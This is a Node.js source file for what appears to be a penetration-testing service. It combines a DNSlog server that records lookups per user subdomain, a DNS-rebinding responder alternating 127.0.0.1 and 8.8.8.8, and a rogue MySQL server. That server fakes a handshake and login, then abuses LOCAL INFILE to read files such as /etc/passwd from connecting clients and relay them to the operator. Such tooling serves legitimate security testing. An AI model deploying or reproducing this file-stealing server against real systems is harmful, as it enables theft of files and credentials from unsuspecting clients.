var named = require('./lib/index');
var server = named.createServer();
var ttl = 300;
var rebind = {};
var app = require('express')();
var httpserver = require('http').Server(app);
var io = require('socket.io')(httpserver);
var gsocket = {};
var net = require("net");
var mysqlfile = {};
var config = require("./config");
var OAuth = require('oauth'), OAuth2 = OAuth.OAuth2;
var https = require('https');
var session = require("express-session");
const Sequelize = require('sequelize');
const sequelize = new Sequelize('sqlite:db/data.db')
var mail = require('./mail');


/*
	HTTP Server
*/
var clientID = config.oauth_id;
var clientSecret = config.oauth_secret;
var oauth2 = new OAuth2(clientID,
                        clientSecret,
                        'https://github.com/', 
                        'login/oauth/authorize',
                        'login/oauth/access_token',
                        null); /** Custom headers */

app.use(session({
        secret: Math.random().toString(36),
        resave: false,
        saveUninitialized: true
        //cookie: { secure: true }   /*secure https这样的情况才可以访问cookie*/
    }))

app.get('/robots.txt',function(req,res){
    res.set('Content-Type','text/plain');
    res.send("User-agent: *\r\nDisallow: ");
})

app.get('/favicon.ico',function(req,res){
    res.sendfile(__dirname + '/favicon.ico');
})

app.get('/', function (req, res) {
    res.sendfile(__dirname + '/web/index.html');
});

app.get('/login', function (req, res) {
    var randomstate = Math.random().toString(36);
    var authURL = oauth2.getAuthorizeUrl({
        redirect_uri: config.oauth_redirect_uri,
        scope: ['user:email'],
        state: randomstate
    });
    req.session.randomstate = randomstate;
    res.redirect(302,authURL);
});
app.get('/logout', function (req, res) {
    req.session.token = "";
    req.session.username = "";
    req.session.email = "";
    res.send('ok');
});

app.get('/oauth',function(req,res){
    if(req.query.state !== req.session.randomstate){
        res.end("csrf");
    }
    oauth2.getOAuthAccessToken(
        req.query.code,
        {'redirect_uri': config.oauth_redirect_uri},
        function (e, access_token, refresh_token, results){
            if (e) {
                console.log(e);
                res.end(e);
            } else if (results.error) {
                console.log(results);
                res.end(JSON.stringify(results));
            }
            else {
                console.log('Obtained access_token: ', access_token);
                //curl -H "Authorization: token OAUTH-TOKEN" https://api.github.com/user
                var option={
    			    hostname:'api.github.com',
    			    path:'/user',
    			    headers:{
    			    	"Authorization":"token "+access_token,
    			    	"User-Agent":"Nodejs https"
    			    }
    			}
    			https.get(option,function(httpsres){
    			  var chunks = [];
    			  httpsres.on('data',function(chunk){
    			    chunks.push(chunk);
    			  })
    			  httpsres.on('end',function(){
    			    result = Buffer.concat(chunks).toString();
    			    // res.end(result);
                    var userinfo = JSON.parse(result);
    			    req.session.username = userinfo['login'];
                    req.session.avatar_url = userinfo['avatar_url'];
                    req.session.email = userinfo['email'];
                    safeQuery('select id from dnslog_user where username= :username',{
                        username:userinfo['login']
                    },function(qres){
                        if(qres.length > 0){
                            safeQuery('select token from dnslog_user where username= :username',{
                                username : userinfo['login']
                            },function(qres){
                                req.session.token = qres[0]['token'];
                                res.end("<script>location='/main.html';</script>")
                            })
                        }else{
                            req.session.token = Math.random().toString(36);
                            safeQuery("insert into dnslog_user (username,email,avatar_url,subdomain,token) values (:username,:email,:avatar_url,:subdomain,:token)",{
                                username : userinfo['login'],
                                email : userinfo['email'],
                                avatar_url : userinfo['avatar_url'],
                                subdomain : userinfo['login'].toLowerCase() + "." + config.domain,
                                token : req.session.token
                            },function(qres){
                                //insert into table about user's info
                            })
                            res.end("<script>location='/main.html';</script>")
                        }
                    })
    			  })
    			})
            }
    });
})

app.get('/userinfo',function(req,res){
    if(typeof(req.session.token) == 'undefined' || req.session.token == ""){
        res.send('{}');
    }else{
        safeQuery('select subdomain from dnslog_user where token= :token',{
            token : req.session.token
        },function(qres){
            var userinfo = {"name":req.session.username,"email":req.session.email,"avatar_url":req.session.avatar_url,"token":req.session.token,"subdomain":qres[0]['subdomain']};
            res.send(JSON.stringify(userinfo));        
        })
    }

})

app.get('/main.html',function(req,res){
	res.sendfile(__dirname + '/web/main.html');
})

app.get('/getdnslog',function(req,res){
    safeQuery('select * from dnslog_log where userid=(select id from dnslog_user where username= :username)',{
        username : req.session.username
    },function(qres){
        res.end(JSON.stringify(qres));
    })
})

app.get('/cleardnslog',function(req,res){
    safeQuery('delete from dnslog_log where userid=(select id from dnslog_user where username= :username)',{
        username : req.session.username
    },function(){
        res.end();
    })
})

io.on('connection', function (socket) {
	var randDomain = getRandomDomain(5);
    var loginDomain;
	socket.emit('randomDomain', { domain: randDomain });
	gsocket[randDomain] = socket;
	socket.on('mysql',function(data){
        if(typeof(randomDomain) !== "undefined"){
		  mysqlfile[randomDomain.split('.')[0]] = data.filename;
		// console.log(mysqlfile[randDomain]);
        }
	});
 	socket.on('disconnect',function(){
 		delete gsocket[randDomain];
 		delete mysqlfile[randDomain.split('.')[0]];
        delete gsocket[loginDomain];
 		console.log('disconnect:\n'+randDomain);
        console.log(loginDomain)
	});
    socket.on('login',function(data){
        safeQuery('select subdomain from dnslog_user where token= :token',{
            token : data.token
        },function(qres){
            delete gsocket[randDomain];
            randomDomain = qres[0]['subdomain'];
            gsocket[randomDomain] = socket;
            loginDomain = qres[0]['subdomain'];
            socket.emit('loginstatus',{status:"connect success!"})
        })
    })
});


httpserver.listen(config.http_port,function(){
	console.log('HTTP server started on port '+config.http_port);
});

function getRandomDomain(len){
	return Math.random().toString(36).substr(13-len)+'.'+config.domain;
}

server.listen(config.dns_port, '0.0.0.0', function() {
	console.log('DNS server started on port '+config.dns_port);
});


/*
	DNS Server
*/
server.on('query', function(query) {
	var domain = query.name();
	console.log('DNS Query: %s', domain)
	if(domain == 'rebind.test.com'){
		if(typeof(rebind.times) == 'undefined'){
			rebind.times = 1;
			var record = new named.ARecord('127.0.0.1');
			query.addAnswer(domain, record, 0);
			query.respond();
		}else{
			var record = new named.ARecord('8.8.8.8');
			query.addAnswer(domain, record, 0);
			query.respond();
			rebind.times ++;
		}
	}else{
		if(domain.split('.').length > 3 ){
			var qdomain = domain.split('.').slice(-4).join('.');
			console.log(qdomain);
			if(typeof(gsocket[qdomain])!=="undefined"){
				gsocket[qdomain].emit('dnslog',{dnslog:domain+" from "+query._client.address});	
			}
            safeQuery('select id from dnslog_user where subdomain= :subdomain',{
                subdomain : qdomain
            },function(qres){
                if(qres.length > 0){
                    safeQuery('insert into dnslog_log (dnslog,inserttime,ip,userid) values (:dnslog,:inserttime,:ip,:userid)',{
                        dnslog : domain,
                        inserttime: currentTime(),
                        ip : query._client.address,
                        userid : qres[0]['id']
                    },function(){
                        if(typeof(gsocket[qdomain]) == "undefined"){
                             safeQuery('select email from dnslog_user where subdomain= :subdomain',{
                                subdomain : qdomain
                            },function(qres){
                                if(qres[0]['email'] !== ""){
                                    var mailcontent = "You have a new dnslog: \n" + domain + "\nFrom ip: " + query._client.address
                                    mail.send(qres[0]['email'],"【NEW DNSLOG】" + domain,mailcontent)
                                }
                            })
                        }
                    })
                }
            })
		}
		var record = new named.ARecord('8.8.8.8');
		query.addAnswer(domain, record, ttl);
		query.respond();
	}
});

/* 
	MYSQL Server
*/
var server = net.createServer(function(socket){
    /* 获取地址信息 */
    //var address = server.address();
    var filename = "/etc/passwd";
    var handshake = "\x45\x00\x00\x00\x0a\x35\x2e\x31\x2e\x36\x33\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x30\x2e\x30\x34\x2e\x31\x00\x26\x00\x00\x00\x7a\x42\x7a\x60\x51\x56\x3b\x64\x00\xff\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x4c\x2f\x44\x47\x77\x43\x2a\x43\x56\x63\x72\x00";
    var authsuccess = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00";
    var someshit = "\x07\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";
    /* 发送数据 */
    //console.log(socket.remoteAddress);
    socket.write(handshake,'binary',function(){
        socket.once('data',function(data){
            //console.log(data.toString());
            //console.log(socket);
            socket.write(authsuccess,'binary');
            //socket.write(someshit,'binary');
            var userinfo = data.toString();
            var username = userinfo.slice(36).split("\x00")[0];
            if(typeof(mysqlfile[username]) !== "undefined"){
            	filename = mysqlfile[username];
            	// console.log(mysqlfile);
            }
            var wantfile = String.fromCharCode(filename.length+1)+"\x00\x00\x01\xFB"+filename
            console.log("username: "+username);
            socket.once('data',function(data){
                socket.write(wantfile,'binary');
                socket.on('data',function(data){
                    var data = "From IP: "+ socket.remoteAddress.split(":").slice(-1)[0] +"\n"+data.toString();
                    //console.log(data);
                    if(data.indexOf("select")>-1){
                        socket.write(wantfile,'binary');
                        //console.log("send file read request");
                    }else{
                    	if(typeof(gsocket[username+'.'+config.domain])!=="undefined"){
							gsocket[username+'.'+config.domain].emit('mysql',{dnslog:data});	
						}
                        socket.end(null,'binary');
                    }
                    
                });
            });
        })
    })
    /* 监听data事件 */
    socket.on('error', function (err) {
        console.log(err);
    });
    socket.on('end', function () {
        console.log('连接结束');
    });
    socket.on('close', function () {
        console.log('连接关闭');
    });
})
/* 获取地址信息 */
server.listen(config.mysql_port,function(){
    console.log("mysql server on "+config.mysql_port);
})


/*
    public functions
*/
function safeQuery(sql,data,callback){
    sequelize.query(sql, {
        replacements:data
    }).then(function(result){
        callback(result[0])
    })  
}

function currentTime(){
    var day = new Date();
    day.setDate(day.getDate());
    return day;
}
